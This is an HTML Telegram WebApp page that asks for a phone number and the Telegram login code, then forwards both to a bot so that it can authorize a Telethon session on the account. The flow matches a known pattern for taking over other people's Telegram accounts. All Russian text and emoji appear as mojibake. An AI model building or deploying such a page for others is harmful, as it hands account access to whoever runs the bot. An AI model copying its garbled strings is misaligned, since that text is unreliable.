<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</title>
    <!-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ Telegram WebApp SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            transition: background-color 0.3s ease;
        }

        /* –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Ü–≤–µ—Ç–∞ —Ñ–æ–Ω–∞ –∏ –≥—Ä–∞–Ω–∏—Ü—ã –¥–ª—è —Å–≤–µ—Ç–ª–æ–π/—Ç–µ–º–Ω–æ–π —Ç–µ–º—ã */
        .card-bg {
            background-color: var(--tg-theme-secondary-bg-color, #f4f4f5);
            border: 1px solid var(--tg-theme-hint-color, #e4e4e7);
        }

        /* –°—Ç–∏–ª—å –¥–ª—è –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø–æ–ª—è –≤–≤–æ–¥–∞ (—Ñ–æ–∫—É—Å) */
        .input-primary:focus {
            border-color: var(--tg-theme-link-color, #2481cc);
            box-shadow: 0 0 0 2px var(--tg-theme-link-color, #2481cc)1a; /* 1a –¥–ª—è –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç–∏ */
        }
        
        .code-input {
            width: 3.5rem;
            height: 3.5rem;
            text-align: center;
            font-size: 1.5rem;
            margin: 0 0.25rem;
            transition: all 0.2s;
        }
        
        /* –°—Ç–∏–ª–∏–∑–∞—Ü–∏—è –¥–ª—è Select */
        .country-select {
            appearance: none; /* –£–±–∏—Ä–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é —Å—Ç—Ä–µ–ª–∫—É */
            -webkit-appearance: none;
            -moz-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='%236b7280'%3E%3Cpath fill-rule='evenodd' d='M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z' clip-rule='evenodd' /%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 0.5rem center;
            background-size: 1.5em 1.5em;
        }
    </style>
</head>
<body class="bg-[var(--tg-theme-bg-color)] flex items-center justify-center min-h-screen p-4">

    <div id="app" class="w-full max-w-md">
        
        <!-- PHONE INPUT SCREEN -->
        <div id="phone-screen" class="card-bg p-6 rounded-2xl shadow-xl transition-opacity duration-300">
            <div class="text-center mb-6">
                <!-- –ò–∫–æ–Ω–∫–∞ –∑–∞–º–∫–∞ –¥–ª—è –≤–∏–∑—É–∞–ª–∞ -->
                <svg class="w-10 h-10 mx-auto text-[var(--tg-theme-link-color)]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6-6v4h12v-4a2 2 0 00-2-2h-8a2 2 0 00-2 2zM9 10V7a3 3 0 016 0v3m-3 0v4m0 0v-4"></path>
                </svg>
                <h2 class="text-2xl font-bold mt-2 text-[var(--tg-theme-text-color)]">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Telethon</h2>
                <p class="text-sm text-[var(--tg-theme-hint-color)]">–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞ –∫ –±–æ—Ç—É</p>
            </div>
            
            <p class="mb-4 text-[var(--tg-theme-hint-color)] text-sm">
                –í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É –∏ –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.
            </p>
            
            <!-- COUNTRY SELECTION AND PHONE INPUT -->
            <div class="space-y-4 mb-4">
                
                <!-- Country Select -->
                <div class="relative">
                    <label for="country-select" class="block text-xs font-medium mb-1 text-[var(--tg-theme-hint-color)]">–°—Ç—Ä–∞–Ω–∞</label>
                    <select id="country-select" 
                            class="country-select w-full p-3 pr-10 rounded-lg border-2 bg-[var(--tg-theme-secondary-bg-color)] 
                                   text-[var(--tg-theme-text-color)] input-primary"
                            style="border-color: var(--tg-theme-hint-color, #555);">
                        <!-- Options will be populated by JS -->
                    </select>
                </div>

                <!-- Phone Input -->
                <div class="flex">
                    <div id="country-code-display" 
                         class="flex items-center p-3 rounded-l-lg border-2 border-r-0 bg-[var(--tg-theme-secondary-bg-color)] 
                                text-[var(--tg-theme-text-color)] font-mono text-sm"
                         style="border-color: var(--tg-theme-hint-color, #555);">
                        <!-- Code from JS, e.g., +7 -->
                    </div>
                    <input type="tel" id="phone-input" 
                           class="w-full p-3 rounded-r-lg border-2 bg-[var(--tg-theme-secondary-bg-color)] 
                                  text-[var(--tg-theme-text-color)] input-primary"
                           style="border-color: var(--tg-theme-hint-color, #555);"
                           placeholder="(XXX) XXX-XX-XX">
                </div>
            </div>
            
            <div id="phone-message" class="text-center mb-4 min-h-6 text-[var(--tg-theme-hint-color)] text-sm"></div>
            
            <button id="phone-button" 
                    class="w-full py-3 rounded-xl font-bold text-white transition duration-200 
                           bg-[var(--tg-theme-button-color)] hover:opacity-90 disabled:opacity-50 shadow-md">
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
            </button>
        </div>

        <!-- CODE INPUT SCREEN -->
        <div id="code-screen" class="card-bg p-6 rounded-2xl shadow-xl transition-opacity duration-300 hidden">
            <div class="text-center mb-6">
                <!-- –ò–∫–æ–Ω–∫–∞ –¥–ª—è –∫–æ–¥–∞ -->
                <svg class="w-10 h-10 mx-auto text-[var(--tg-theme-link-color)]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7v3m0 10v1a2 2 0 01-2 2H7a2 2 0 01-2-2v-6m0-2h10m6-5a2 2 0 00-2-2H7a2 2 0 00-2 2v6m12-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v6"></path>
                </svg>
                <h2 class="text-2xl font-bold mt-2 text-[var(--tg-theme-text-color)]">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h2>
                <p class="text-sm text-[var(--tg-theme-hint-color)]">–ü—Ä–æ–≤–µ—Ä—å—Ç–µ —á–∞—Ç Telegram</p>
            </div>
            
            <p class="mb-6 text-center text-[var(--tg-theme-hint-color)] text-sm">
                –ö–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram.
            </p>
            
            <div id="code-inputs-container" class="flex justify-center mb-6" data-length="5">
                <!-- –ü–æ–ª—è –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –±—É–¥—É—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω—ã JS -->
            </div>
            
            <div id="code-message" class="text-center mb-4 min-h-6 text-[var(--tg-theme-hint-color)] text-sm"></div>

            <button id="code-button" 
                    class="w-full py-3 rounded-xl font-bold text-white transition duration-200 
                           bg-[var(--tg-theme-button-color)] hover:opacity-90 disabled:opacity-50 shadow-md">
                –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—Ö–æ–¥
            </button>
        </div>
        
        <!-- SUCCESS SCREEN -->
        <div id="success-screen" class="card-bg p-6 rounded-2xl shadow-xl transition-opacity duration-300 hidden">
            <div class="text-center mb-6">
                <!-- –ò–∫–æ–Ω–∫–∞ —É—Å–ø–µ—Ö–∞ -->
                <svg class="w-10 h-10 mx-auto text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <h2 class="text-2xl font-bold mt-2 text-[var(--tg-theme-text-color)]">–£—Å–ø–µ—Ö!</h2>
                <p class="text-sm text-[var(--tg-theme-hint-color)]">–ê–∫–∫–∞—É–Ω—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω</p>
            </div>
            <p class="mb-6 text-center text-[var(--tg-theme-text-color)]">
                –í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç. –¢–µ–ø–µ—Ä—å –±–æ—Ç –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–µ–π—Å—Ç–≤–∏—è. –ú–æ–∂–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç—å —ç—Ç–æ –æ–∫–Ω–æ.
            </p>
            <button id="close-button" 
                    class="w-full py-3 rounded-xl font-bold text-white transition duration-200 
                           bg-[var(--tg-theme-button-color)] hover:opacity-90 shadow-md">
                –ó–∞–∫—Ä—ã—Ç—å WebApp
            </button>
        </div>

    </div>

    <script>
        const phoneScreen = document.getElementById('phone-screen');
        const codeScreen = document.getElementById('code-screen');
        const successScreen = document.getElementById('success-screen'); // –ù–æ–≤—ã–π —ç–∫—Ä–∞–Ω
        const phoneInput = document.getElementById('phone-input');
        const countrySelect = document.getElementById('country-select');
        const countryCodeDisplay = document.getElementById('country-code-display');
        const phoneButton = document.getElementById('phone-button');
        const codeButton = document.getElementById('code-button');
        const phoneMessage = document.getElementById('phone-message');
        const codeMessage = document.getElementById('code-message');
        const codeInputsContainer = document.getElementById('code-inputs-container');
        const closeButton = document.getElementById('close-button');

        // –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è WebApp
        const WebApp = window.Telegram.WebApp;

        // –î–∞–Ω–Ω—ã–µ –ø–æ —Å—Ç—Ä–∞–Ω–∞–º (–∫–æ–¥, –∏–º—è, placeholder –¥–ª—è –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞)
        const countries = [
            { code: '+7', name: 'üá∑üá∫ –†–æ—Å—Å–∏—è', placeholder: '(XXX) XXX-XX-XX', default: true },
            { code: '+380', name: 'üá∫üá¶ –£–∫—Ä–∞–∏–Ω–∞', placeholder: '(XX) XXX-XX-XX' },
            { code: '+375', name: 'üáßüáæ –ë–µ–ª–∞—Ä—É—Å—å', placeholder: '(XX) XXX-XX-XX' },
            { code: '+7', name: 'üá∞üáø –ö–∞–∑–∞—Ö—Å—Ç–∞–Ω', placeholder: '(XXX) XXX-XX-XX' },
            { code: '+1', name: 'üá∫üá∏/üá®üá¶ –°–®–ê/–ö–∞–Ω–∞–¥–∞', placeholder: ' (XXX) XXX-XXXX' },
            { code: '+44', name: 'üá¨üáß –í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è', placeholder: '(XXXX) XXXXXX' },
            { code: '+49', name: 'üá©üá™ –ì–µ—Ä–º–∞–Ω–∏—è', placeholder: '(XXX) XXXXXXX' },
            { code: '+998', name: 'üá∫üáø –£–∑–±–µ–∫–∏—Å—Ç–∞–Ω', placeholder: '(XX) XXX-XX-XX' },
            { code: '+994', name: 'üá¶üáø –ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω', placeholder: '(XX) XXX-XX-XX' },
            { code: '+996', name: 'üá∞üá¨ –ö—ã—Ä–≥—ã–∑—Å—Ç–∞–Ω', placeholder: '(XXX) XXX-XXX' },
        ];

        // --- –£–¢–ò–õ–ò–¢–´ ---
        function displayMessage(container, message, type = 'info') {
            const el = container === 'phone' ? phoneMessage : codeMessage;
            el.innerHTML = message;
            if (type === 'error') {
                el.style.color = 'var(--tg-theme-destructive-text-color, #ff3b30)';
            } else if (type === 'success') {
                el.style.color = 'var(--tg-theme-link-color, #34c759)';
            } else {
                el.style.color = 'var(--tg-theme-hint-color, #aaa)';
            }
        }

        function switchScreen(screenId) {
            phoneScreen.classList.add('hidden');
            codeScreen.classList.add('hidden');
            successScreen.classList.add('hidden');

            if (screenId === 'phone') {
                phoneScreen.classList.remove('hidden');
            } else if (screenId === 'code') {
                codeScreen.classList.remove('hidden');
            } else if (screenId === 'success') {
                successScreen.classList.remove('hidden');
            }
            
            WebApp.expand(); // –†–∞—Å—à–∏—Ä—è–µ–º WebApp –ø—Ä–∏ —Å–º–µ–Ω–µ —ç–∫—Ä–∞–Ω–∞
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            const results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        function populateCountrySelect() {
            countries.forEach((country, index) => {
                const option = document.createElement('option');
                option.value = index; // –ò—Å–ø–æ–ª—å–∑—É–µ–º –∏–Ω–¥–µ–∫—Å –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ –∫ –æ–±—ä–µ–∫—Ç—É
                option.textContent = `${country.name} (${country.code})`;
                countrySelect.appendChild(option);
                if (country.default) {
                    countrySelect.value = index;
                }
            });
            updatePhoneInput(); // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        }
        
        function updatePhoneInput() {
            const index = parseInt(countrySelect.value);
            const country = countries[index];
            
            if (country) {
                countryCodeDisplay.textContent = country.code;
                phoneInput.placeholder = country.placeholder;
                phoneInput.focus();
            }
        }

        // --- –ì–ï–ù–ï–†–ê–¶–ò–Ø –ü–û–õ–ï–ô –ö–û–î–ê ---
        function generateCodeInputs(length) {
            codeInputsContainer.innerHTML = '';
            for (let i = 0; i < length; i++) {
                const input = document.createElement('input');
                input.type = 'tel';
                input.maxLength = '1';
                input.classList.add(
                    'code-input', 'rounded-lg', 'border-2', 'bg-[var(--tg-theme-secondary-bg-color)]',
                    'text-[var(--tg-theme-text-color)]', 'input-primary', 'focus:ring-2', 'focus:ring-opacity-50'
                );
                input.style.borderColor = 'var(--tg-theme-hint-color, #555)';
                input.addEventListener('input', handleCodeInput);
                input.addEventListener('keydown', handleCodeKeyDown);
                codeInputsContainer.appendChild(input);
            }
        }

        function handleCodeInput(e) {
            const input = e.target;
            const value = input.value;

            // –û—á–∏—â–∞–µ–º –æ—Ç –Ω–µ-—Ü–∏—Ñ—Ä
            input.value = value.replace(/\D/g, '');

            // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–æ–ª—é
            if (input.value.length === 1) {
                const nextInput = input.nextElementSibling;
                if (nextInput && nextInput.tagName === 'INPUT') {
                    nextInput.focus();
                }
            }
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –º–æ–∂–Ω–æ –ª–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –∫–Ω–æ–ø–∫—É
            checkCodeCompletion();
        }
        
        function handleCodeKeyDown(e) {
            const input = e.target;
            // –ü–µ—Ä–µ—Ö–æ–¥ –∫ –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É –ø–æ–ª—é –ø—Ä–∏ Backspace, –µ—Å–ª–∏ —Ç–µ–∫—É—â–µ–µ –ø—É—Å—Ç–æ
            if (e.key === 'Backspace' && input.value.length === 0) {
                const prevInput = input.previousElementSibling;
                if (prevInput && prevInput.tagName === 'INPUT') {
                    prevInput.focus();
                    e.preventDefault();
                }
            }
        }

        function checkCodeCompletion() {
            const codeInputs = Array.from(codeInputsContainer.querySelectorAll('input'));
            const code = codeInputs.map(input => input.value).join('');
            const requiredLength = codeInputsContainer.getAttribute('data-length');
            codeButton.disabled = code.length !== parseInt(requiredLength);
        }
        
        // --- –û–°–ù–û–í–ù–ê–Ø –õ–û–ì–ò–ö–ê ---

        function initWebApp() {
            WebApp.ready();
            WebApp.MainButton.hide(); 

            // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ç–µ–º—ã
            document.body.style.backgroundColor = WebApp.themeParams.bg_color || '#ffffff';
            
            // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—ã–ø–∞–¥–∞—é—â–µ–≥–æ —Å–ø–∏—Å–∫–∞ —Å—Ç—Ä–∞–Ω
            populateCountrySelect();
            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –ø–æ–ª—è –∫–æ–¥–∞ (5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)
            generateCodeInputs(5); 

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º URL-–ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —ç–∫—Ä–∞–Ω–∞
            const step = getUrlParameter('step');
            if (step === 'code') {
                switchScreen('code');
            } else if (step === 'success') {
                switchScreen('success');
            } else {
                switchScreen('phone');
            }

            // --- –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–ë–´–¢–ò–ô ---
            
            // –ü—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω—ã –æ–±–Ω–æ–≤–ª—è–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
            countrySelect.addEventListener('change', updatePhoneInput);

            // –ö–Ω–æ–ø–∫–∞ "–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥"
            phoneButton.addEventListener('click', () => {
                const index = parseInt(countrySelect.value);
                const countryCode = countries[index].code;
                const numberPart = phoneInput.value.trim().replace(/\s|\(|\)|\-|\./g, ''); // –û—á–∏—Å—Ç–∫–∞ –æ—Ç –º–∞—Å–∫–∏

                // –ü–æ–ª–Ω—ã–π –Ω–æ–º–µ—Ä –≤ –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ
                const fullPhone = countryCode + numberPart; 
                
                if (numberPart.length < 5) { // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª–∏–Ω—ã
                    displayMessage('phone', '–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.', 'error');
                    return;
                }
                
                // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
                phoneButton.disabled = true;
                phoneButton.innerText = '–û—Ç–ø—Ä–∞–≤–∫–∞...';

                displayMessage('phone', '–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –±–æ—Ç—É...');

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –±–æ—Ç—É
                const data = {
                    step: 'phone',
                    phone: fullPhone // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –Ω–æ–º–µ—Ä —Å –∫–æ–¥–æ–º —Å—Ç—Ä–∞–Ω—ã
                };

                try {
                    // WebApp.sendData –∑–∞–∫—Ä—ã–≤–∞–µ—Ç WebApp. –ë–æ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ.
                    WebApp.sendData(JSON.stringify(data));
                } catch (error) {
                    displayMessage('phone', '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram: ' + error.message, 'error');
                    phoneButton.disabled = false;
                    phoneButton.innerText = '–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥';
                }
            });

            // –ö–Ω–æ–ø–∫–∞ "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—Ö–æ–¥"
            codeButton.addEventListener('click', () => {
                const codeInputs = Array.from(codeInputsContainer.querySelectorAll('input'));
                const code = codeInputs.map(input => input.value).join('');

                if (code.length !== codeInputs.length) {
                    displayMessage('code', `–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ ${codeInputs.length}-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –ø–æ–ª–Ω–æ—Å—Ç—å—é.`, 'error');
                    return;
                }
                
                // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
                codeButton.disabled = true;
                codeButton.innerText = '–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...';

                displayMessage('code', '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...', 'info');

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –±–æ—Ç—É
                const data = {
                    step: 'code',
                    code: code
                };

                try {
                    // WebApp.sendData –∑–∞–∫—Ä—ã–≤–∞–µ—Ç WebApp. –ë–æ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ.
                    WebApp.sendData(JSON.stringify(data));
                } catch (error) {
                    displayMessage('code', '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram: ' + error.message, 'error');
                    codeButton.disabled = false;
                    codeButton.innerText = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—Ö–æ–¥';
                }
            });
            
            // –ö–Ω–æ–ø–∫–∞ "–ó–∞–∫—Ä—ã—Ç—å WebApp" (–Ω–∞ —ç–∫—Ä–∞–Ω–µ —É—Å–ø–µ—Ö–∞)
            closeButton.addEventListener('click', () => {
                WebApp.close();
            });

            checkCodeCompletion(); // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ –∫–æ–¥–∞ –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
        }

        // –ó–∞–ø—É—Å–∫ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞ WebApp
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initWebApp);
        } else {
            initWebApp();
        }
    </script>
</body>
    </html>
    
